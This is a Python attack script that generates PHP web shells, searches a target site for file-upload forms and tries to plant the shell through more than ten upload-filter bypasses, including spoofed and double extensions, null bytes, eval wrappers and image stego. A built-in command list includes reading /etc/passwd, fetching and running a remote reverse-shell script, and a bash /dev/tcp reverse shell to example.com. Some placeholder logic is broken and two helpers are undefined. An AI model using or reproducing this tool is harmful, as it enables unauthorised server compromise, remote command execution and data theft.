import requests
import random
import hashlib
import base64
import zlib
import json
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup
import os
import logging

# Import or define ContentDiscovery from your codebase
from content_discovery import ContentDiscovery

# set up logger
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
stream_handler = logging.StreamHandler()
stream_handler.setFormatter(formatter)
logger.addHandler(stream_handler)

RANDOM_COMMANDS = [
    "ls -lah",
    "cat /etc/passwd",
    "uname -a",
    "ps aux",
    "netstat -tulpn",
    "wget -O- https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php | php -q",
    "curl -sS http://example.com/shell.php",
    "wget http://example.com/shell.php",
    "bash -i >& /dev/tcp/example.com/1234 0>&1"
]
IMAGE_FILE = 'image.jpg'

def generate_random_shell(newsrst_method, custom_command=None, encryption_key=None):
    # validate method
    if newsrst_method not in ['GET', 'POST', 'HTTP']:
        logger.error("Invalid request method: %s", newsrst_method)
        return False

    random_command = custom_command or random.choice(RANDOM_COMMANDS)

    if newsrst_method == 'GET':
        shell_code = (
            "<?php\n"
            "if (isset($_GET['cmd'])) {\n"
            "    $cmd = $_GET['cmd'];\n"
            "    $output = shell_exec($cmd);\n"
            "    echo \"<pre>$output</pre>\";\n"
            "}\n"
            "?>"
        )
    elif newsrst_method == 'POST':
        shell_code = (
            "<?php\n"
            "if (isset($_POST['command'])) {\n"
            "    $command = $_POST['command'];\n"
            "    $output = shell_exec($command);\n"
            "    echo \"<pre>$output</pre>\";\n"
            "}\n"
            "?>"
        )
    else:  # HTTP
        shell_code = (
            "<?php\n"
            "$request_body = file_get_contents('php://input');\n"
            "$cmd = json_decode($request_body)->cmd;\n"
            "$output = shell_exec($cmd);\n"
            f"if ({json.dumps(encryption_key)}) {{\n"
            "    $iv = random_bytes(openssl_cipher_iv_length('aes-256-cbc'));\n"
            "    $encrypted_output = openssl_encrypt($output, 'aes-256-cbc', hex2bin("
            f"{json.dumps(encryption_key)}), 0, $iv);\n"
            "    $output = base64_encode($encrypted_output . '::' . $iv);\n"
            "}\n"
            "echo json_encode(['output' => $output]);\n"
            "?>"
        )

    # embed command if placeholder used
    shell_code = shell_code.replace('{random_command}', random_command)

    # compress & encode
    base64_shell_code = base64.b64encode(shell_code.encode('utf-8'))
    compressed_shell_code = zlib.compress(base64_shell_code)
    data_uri = f"data:image/jpeg;base64,{base64.b64encode(compressed_shell_code).decode('utf-8')}"
    shell_code = shell_code.replace('{shell_code}', data_uri)

    return shell_code

def random_shell_name():
    return f"{random.randint(11111,99999)}.php"

def find_upload_point(url):
    try:
        resp = requests.get(url, verify=True, timeout=10)
    except requests.exceptions.RequestException as e:
        logger.error("Failed to connect to %s: %s", url, str(e))
        return None, None

    if resp.status_code != 200:
        logger.error("Non-200 response from %s: %d", url, resp.status_code)
        return None, None

    soup = BeautifulSoup(resp.text, 'html.parser')
    for form in soup.find_all('form', {'method': ['post', 'POST']}):
        if form.find('input', {'type': 'file'}):
            action = form.get('action') or url
            enctype = form.get('enctype', 'multipart/form-data')
            return urljoin(url, action), enctype

    # fallback to content discovery
    cd = ContentDiscovery(url)
    cd.run()
    for link in cd.links:
        if 'upload' in link.lower():
            try:
                r2 = requests.get(link, verify=True, timeout=10)
            except requests.exceptions.RequestException as e:
                logger.error("Failed to connect to %s: %s", link, str(e))
                continue
            if r2.status_code != 200:
                continue
            soup2 = BeautifulSoup(r2.text, 'html.parser')
            for form in soup2.find_all('form', {'method': ['post', 'POST']}):
                if form.find('input', {'type': 'file'}):
                    action = form.get('action') or link
                    enctype = form.get('enctype', 'multipart/form-data')
                    return urljoin(link, action), enctype

    return None, None

def upload_file(url, upload_point, enctype, shell_name, shell_content):
    headers = {'Content-Type': enctype}
    methods = []

    # helper to attempt upload
    def attempt(name, content):
        files = {'file': (name, content)}
        try:
            r = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers, verify=True, timeout=15)
        except requests.exceptions.RequestException as e:
            logger.error("Upload %s failed: %s", name, str(e))
            return None
        if r.status_code == 200 and 'success' in r.text.lower():
            return urljoin(url, name)
        return None

    # 1) spoofed extensions
    base, _ = os.path.splitext(shell_name)
    for ext in ['jpg','png','gif','txt','doc','pdf']:
        res = attempt(f"{base}.{ext}", shell_content)
        if res: return res

    # 2) null byte
    res = attempt(shell_name + '\x00.jpg', shell_content)
    if res: return res

    # 3) double extension
    res = attempt(f"{base}.jpg.php", shell_content)
    if res: return res

    # 4) large payload
    res = attempt(shell_name, b'A'*1024*1024 + shell_content)
    if res: return res

    # 5) stego in image
    if os.path.isfile(IMAGE_FILE):
        with open(IMAGE_FILE,'rb') as f:
            img = f.read()
        res = attempt(shell_name, img + shell_content)
        if res: return res

    # 6) base64 + eval
    b64 = base64.b64encode(shell_content).decode('utf-8')
    res = attempt(shell_name, f"<?php eval(base64_decode('{b64}')); ?>".encode('utf-8'))
    if res: return res

    # 7) zlib + gzinflate
    comp = zlib.compress(shell_content)
    res = attempt(shell_name, f"<?php eval(gzinflate('{comp.hex()}')); ?>".encode('utf-8'))
    if res: return res

    # 8) pure eval
    res = attempt(shell_name, f"<?php eval('{shell_content.decode()}'); ?>".encode('utf-8'))
    if res: return res

    # 9) data URI
    res = attempt(shell_name, f"data:image/jpeg;base64,{b64}".encode('utf-8'))
    if res: return res

    # 10) custom ext
    custom = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
    res = attempt(f"{base}.{custom}", shell_content)
    if res: return res

    # 11) polyglot & stego placeholders
    # requires create_polyglot_file and hide_data_in_image functions
    try:
        poly = create_polyglot_file(shell_content)
        res = attempt(shell_name, poly)
        if res: return res
    except Exception as e:
        logger.error("Polyglot failed: %s", str(e))

    try:
        stego = hide_data_in_image(IMAGE_FILE, shell_content)
        res = attempt(shell_name, stego)
        if res: return res
    except Exception as e:
        logger.error("Stego failed: %s", str(e))

    logger.error("All upload methods failed for %s", shell_name)
    return None

def try_upload_methods(url, shell_name, shell_content):
    upload_point, enctype = find_upload_point(url)
    if not upload_point:
        logger.error("No upload point found at %s", url)
        return None
    path = upload_file(url, upload_point, enctype, shell_name, shell_content)
    if path:
        logger.info("Shell uploaded successfully: %s", path)
    else:
        logger.error("Failed to upload shell to %s", url)
    return path

def main():
    url = input("Enter the target URL: ").strip()
    method = input("Enter request method (GET, POST, HTTP): ").strip().upper()
    cmd = input("Enter custom command (optional): ").strip() or None
    key = input("Enter encryption key (optional): ").strip() or None

    shell_name = random_shell_name()
    shell = generate_random_shell(method, cmd, key)
    if not shell:
        logger.error("Cannot generate shell code, invalid method.")
        return

    try_upload_methods(url, shell_name, shell.encode('utf-8'))

if __name__ == "__main__":
    main()